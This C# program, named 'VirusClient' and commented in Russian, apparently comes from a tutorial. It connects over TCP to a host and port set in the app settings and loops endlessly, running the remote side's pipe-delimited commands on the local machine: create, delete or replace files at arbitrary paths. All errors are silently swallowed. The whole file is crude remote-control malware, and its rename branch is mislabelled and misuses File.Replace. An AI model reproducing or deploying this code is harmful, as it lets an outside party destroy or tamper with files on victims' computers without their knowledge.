using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace VirusClient
{
    class Program
    {
        //https://www.youtube.com/watch?v=RgQ4_XJ6NbU&t=451s
        static void Main(string[] args)
        {
            string log = "Журнал событий \t\n";
            try
            {

             
            IPAddress address = IPAddress.Parse(Properties.Settings.Default.IP); //Получаем текущий адрес из настроек приложени(параметров)
            int port = Properties.Settings.Default.Port; // порт подключения
            IPEndPoint endPoint = new IPEndPoint(address,port); // точка соединения с программой


            Socket socket = new Socket(SocketType.Stream,ProtocolType.Tcp); //тип подключени я пртокола
            socket.Connect(endPoint); //запуск соединение

            byte[] buffer = new byte[8196]; // буфер для хранения временной передачи из ссокета
            string request = "";

            while (true)
            {
                int byteRecorded = socket.Receive(buffer); //Чтение полученных байтов из сокеда в предворительный буфер
               request = Encoding.UTF8.GetString(buffer,0,byteRecorded); //преобразоввываем полученные биты в строку 
                string[] command = request.Split('|'); //разбиваем полученную строки по массивам

                switch (command[0])
                {
                    case "create":
                        FileStream stream = File.Create(command[1]); //создаем файл по указанном пути в массиве command[1]
                        stream.Close();
                         log += "Сработал метод create \t\n";
                        break;

                    case "delete":
                        File.Delete(command[1]); // удаление
                            log += "Сработал метод delete \t\n";
                            break;

                    case "rename":
                        File.Replace(command[1],command[2],""); // удаление
                            log += "Сработал метод rename \t\n";
                            break;
                }

                    
            }


            }

            catch (Exception ex)
            {

            }

        }
    }
}
